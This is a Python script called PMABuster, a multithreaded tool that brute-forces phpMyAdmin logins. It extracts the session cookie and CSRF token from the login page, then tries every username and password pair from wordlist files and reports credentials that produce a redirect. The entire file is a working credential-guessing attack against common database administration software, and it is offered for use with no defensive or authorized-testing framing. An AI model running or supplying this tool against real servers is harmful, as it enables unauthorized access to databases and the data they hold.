#!/usr/bin/env/python
# -*- coding: utf-8 -*-
import requests
import re
import HTMLParser
import threading
import argparse

flag = 0

def buster_func(url,usernamefile,pwdfilename):
    count = 0
    with open(usernamefile) as f:
        for user in f.readlines():
            for line in open(pwdfilename,'r'):
                password = line.strip()
                t = threading.Thread(target=getpassword, args=(url, user, password))
                t.start()
                getpassword(url,user, password)
                count += 1

def getpassword(url,user,password):
    ss=requests.session()
    r = ss.get(url)
    tmpsession = re.findall(r'phpMyAdmin=(.*?);', r.headers['Set-Cookie'])
    left = r.content.rfind('name="token" value="')
    tmp = r.content[left+20:]
    right = tmp.find('" /></fieldset>')
    token = tmp[:right]
    print("UserName: " + user + "Password: " + password + " Testing ...")
    # print("Token="+token)
    http_parser = HTMLParser.HTMLParser();  
    token = http_parser.unescape(token);  
    post_data={"set_session":tmpsession[0],"pma_username":user,"pma_password":password,"server":"1","target":"index.php","token":token}
    r2 = ss.post(url,data=post_data,allow_redirects=False)
    # print post_data
    if r2.status_code == 302:
        print("The User:Pass is "+ user + ":" + password)
        flag = 1
        exit()

parser = argparse.ArgumentParser(description='PMABuster: A Simple Password Buster For PHPMyAdmin')
parser.add_argument('--url', '-u', help='url, the traget url, required parameters', required=True)
parser.add_argument('--usernamefile', '-uf', help='filename of the username list .txt file', default='username.txt')
parser.add_argument('--pwdfilename', '-pf', help='filename of the username list .txt file', default='password.txt')
args = parser.parse_args()

if __name__ == '__main__':
    try:
        buster_func(args.url,args.usernamefile,args.pwdfilename) 
        if flag:
            print "Finished!"
        else:
            print "Failed"
        
    except Exception as e:
        print(e)